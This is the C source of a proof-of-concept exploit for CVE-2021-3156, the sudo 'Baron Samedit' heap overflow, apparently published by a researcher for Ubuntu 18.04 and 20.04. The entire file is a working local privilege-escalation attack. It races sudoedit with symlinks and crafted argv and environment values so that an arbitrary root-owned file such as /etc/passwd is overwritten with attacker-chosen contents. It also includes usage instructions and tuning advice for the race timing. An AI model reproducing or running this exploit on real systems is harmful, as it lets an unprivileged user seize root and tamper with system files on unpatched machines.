// Exploit by @gf_256 aka cts
// With help from r4j
// Original advisory by Baron Samedit of Qualys

// Tested on Ubuntu 18.04 and 20.04
// You will probably need to adjust RACE_SLEEP_TIME.

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <pwd.h>

// !!! best value of this varies from system-to-system !!! 
// !!! you will probably need to tune this !!! 
#define RACE_SLEEP_TIME 20000

char *target_file;
char *src_file;

size_t query_target_size()
{
    struct stat st;
    stat(target_file, &st);
    return st.st_size;
}

char* read_src_contents()
{
    FILE* f = fopen(src_file, "rb");
    if (!f) {
        puts("oh no baby what are you doing :(");
        abort();
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *content = malloc(fsize + 1);
    fread(content, 1, fsize, f);
    fclose(f);
    return content;
}

char* get_my_username()
{
    // getlogin can return incorrect result (for example, root under su)!
    struct passwd *pws = getpwuid(getuid());
    return strdup(pws->pw_name);
}

int main(int my_argc, char **my_argv)
{
    puts("CVE-2021-3156 PoC by @gf_256");
    puts("original advisory by Baron Samedit");
    
    if (my_argc != 3) {
        puts("./meme <target file> <src file>");
        puts("Example: ./meme /etc/passwd my_fake_passwd_file");
        return 1;
    }
    target_file = my_argv[1];
    src_file = my_argv[2];
    printf("we will overwrite %s with shit from %s\n", target_file, src_file);

    char* myusername = get_my_username();
    printf("hi, my name is %s\n", myusername);

    size_t initial_size = query_target_size();
    printf("%s is %zi big right now\n", target_file, initial_size);

    char* shit_to_write = read_src_contents();

    char memedir[1000];
    char my_symlink[1000];
    char overflow[1000];

    char* bigshit = calloc(1,0x10000);
    memset(bigshit, 'A', 0xffff); // need a big shit in the stack so the write doesn't fail with bad address

    char *argv[] = {"/usr/bin/sudoedit", "-A", "-s", "\\",
    overflow,
    NULL
    };

    char *envp[] = {
        "\n\n\n\n\n", // put some fucken newlines here to separate our real contents from the junk
        shit_to_write,
        "SUDO_ASKPASS=/bin/false",
        "LANG=C.UTF-8@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        bigshit,
        NULL
    };

    puts("ok podracing time bitches");

    for (int i = 0; i < 5000; i++) {
        sprintf(memedir, "ayylmaobigchungussssssssssss00000000000000000000000000%08d", i);
        sprintf(overflow, "11111111111111111111111111111111111111111111111111111111%s", memedir);
        sprintf(my_symlink, "%s/%s", memedir, myusername);
        puts(memedir);
        
        if (access(memedir, F_OK) == 0) {
            printf("dude, %s already exists, do it from a clean working dir\n", memedir);
            return 1;
        }

        pid_t childpid = fork();
        if (childpid) { // parent
            usleep(RACE_SLEEP_TIME);
            mkdir(memedir, 0700);
            symlink(target_file, my_symlink);
            waitpid(childpid, 0, 0);
        } else { // child
            setpriority(PRIO_PROCESS, 0, 20); // set nice to 20 for race reliability
            execve("/usr/bin/sudoedit", argv, envp); // noreturn
            puts("execve fails?!");
            abort();
        }

        if (query_target_size() != initial_size) {
            puts("target file has a BRUH MOMENT!!!! SUCCess???");
            system("xdg-open 'https://www.youtube.com/watch?v=4vkR1G_DUVc'"); // ayy lmao
            return 0;
        }
    }

    puts("Failed?");
    puts("if all the meme dirs are owned by root, the usleep needs to be decreased.");
    puts("if they're all owned by you, the usleep needs to be increased");


    return 0;
}